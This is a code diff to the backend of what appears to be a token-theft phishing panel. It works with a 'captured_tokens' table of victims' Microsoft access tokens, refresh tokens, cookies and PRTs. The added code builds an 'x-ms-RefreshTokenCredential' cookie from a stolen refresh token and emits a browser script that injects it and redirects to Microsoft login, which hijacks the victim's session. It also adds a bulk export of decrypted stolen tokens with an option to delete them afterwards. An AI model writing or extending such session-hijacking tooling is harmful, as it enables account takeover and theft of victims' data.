@@ -224,7 +224,50 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       }
     }
 
-    if (cookiesList.length === 0) {
+    // Generate x-ms-RefreshTokenCredential PRT script (competitor-proven format)
+    var prtScript = null;
+    if (refreshToken) {
+      try {
+        const cookieConverter = require('../services/cookieconverter');
+        // Extract tid/uid from id_token if available
+        var tid = tenant;
+        var uid = '';
+        const idToken = decrypt(token.id_token_encrypted);
+        if (idToken) {
+          try {
+            const idPayload = idToken.split('.')[1];
+            let padded = idPayload;
+            while (padded.length % 4) padded += '=';
+            const decoded = JSON.parse(Buffer.from(padded, 'base64').toString());
+            tid = decoded.tid || tid;
+          } catch (e) { /* ignore */ }
+        }
+        // Try to get uid from session_key_jwe / client_info
+        const sessionKeyJwe = decrypt(token.session_key_jwe);
+        if (sessionKeyJwe) {
+          try {
+            const parsed = JSON.parse(sessionKeyJwe);
+            if (parsed.client_info) {
+              const decoded = Buffer.from(parsed.client_info, 'base64').toString();
+              const info = JSON.parse(decoded);
+              uid = info.uid || '';
+            }
+          } catch (e) { /* ignore */ }
+        }
+        const prtCookieObj = cookieConverter.generateXmsRefreshTokenCredential(
+          refreshToken,
+          accountType,
+          { tid: tid, uid: uid, scopes: 'openid profile email offline_access https://graph.microsoft.com/.default' }
+        );
+        if (prtCookieObj && prtCookieObj.value) {
+          prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; domain=${prtCookieObj.domain}; path=/; secure; samesite=none";\n// Redirect after 3s\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 3000);`;
+        }
+      } catch (prtErr) {
+        console.error('[Tokens] PRT script generation error:', prtErr.message);
+      }
+    }
+
+    if (cookiesList.length === 0 && !prtScript) {
       return res.status(400).json({ 
         error: 'No cookies available',
         hint: accessToken 
@@ -234,13 +277,14 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     }
 
     var scripts = {};
-    scripts.console = generatePopupScript(cookiesList);
-    scripts.html = generateStandaloneHtml(cookiesList);
-    scripts.python = generatePythonScript(cookiesList);
-    scripts.injector = generateInjectorScript(cookiesList, token.client_id || config.AZURE_CLIENT_ID, tenant);
+    scripts.console = cookiesList.length > 0 ? generatePopupScript(cookiesList) : prtScript || '';
+    scripts.html = cookiesList.length > 0 ? generateStandaloneHtml(cookiesList) : '';
+    scripts.python = cookiesList.length > 0 ? generatePythonScript(cookiesList) : '';
+    scripts.injector = cookiesList.length > 0 ? generateInjectorScript(cookiesList, token.client_id || config.AZURE_CLIENT_ID, tenant) : '';
 
     res.json({
-      script: scripts.console,
+      script: prtScript || scripts.console,
+      prt_script: prtScript,
       scripts: scripts,
       cookie_count: cookiesList.length,
       cookies: cookiesList,
@@ -856,6 +900,8 @@ router.post('/convert-cookie', userAuth, async (req, res) => {
 // ─── Export tokens ──────────────────────────────────────────────────
 router.post('/export', userAuth, async (req, res) => {
   try {
+    const deleteAfter = req.body && req.body.delete_after === true;
+
     const [tokens] = await db.query(
       'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, prt, session_key_jwe, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
       [req.user.id]
@@ -879,12 +925,21 @@ router.post('/export', userAuth, async (req, res) => {
       account_type: token.account_type || 'unknown'
     }));
 
+    if (deleteAfter) {
+      await db.query(
+        'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE user_id = ? AND deleted = 0',
+        [req.user.id]
+      );
+    }
+
     res.json({
       tokens: decryptedTokens,
       exported_at: new Date().toISOString(),
-      count: decryptedTokens.length
+      count: decryptedTokens.length,
+      deleted: deleteAfter
     });
   } catch (err) {
+    console.error('[Tokens] Export error:', err);
     res.status(500).json({ error: 'Server error' });
   }
 });
